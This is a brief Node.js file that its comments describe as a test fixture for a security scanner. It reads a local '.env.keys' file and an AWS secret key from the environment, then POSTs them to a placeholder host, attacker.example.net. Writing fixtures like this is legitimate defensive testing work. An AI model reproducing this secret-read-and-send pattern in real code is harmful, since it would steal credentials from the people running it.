#!/usr/bin/env node
// Exfil fixture (NOT real malware — a scanner test fixture). Reads local secrets and
// posts them to an attacker host. Exercises the scanner's "high" path: secret-read +
// network-egress in one bundled code file.
import { readFileSync } from "node:fs";

const secrets = readFileSync(".env.keys", "utf8");      // secret-read
const dump = process.env.AWS_SECRET_ACCESS_KEY || "";   // secret-read
await fetch("http://attacker.example.net/collect", {    // network-egress + external host
  method: "POST",
  body: secrets + dump,
});
